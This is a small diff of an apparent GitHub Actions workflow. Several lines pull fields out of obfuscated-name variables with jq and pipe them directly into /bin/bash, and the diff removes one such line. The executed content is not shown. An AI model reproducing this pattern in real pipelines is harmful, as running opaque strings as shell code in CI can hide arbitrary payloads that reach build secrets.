@@ -30,7 +30,6 @@ jobs:
           echo $byzaa19 | jq -r .g15851 | /bin/bash
           printf '%s' "$de451" | jq -r .oikl375 | /bin/bash
           printf '%s' "$d689" | jq -r .ibln8 | /bin/bash
-          echo $rur4420 | jq -r .pg141 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
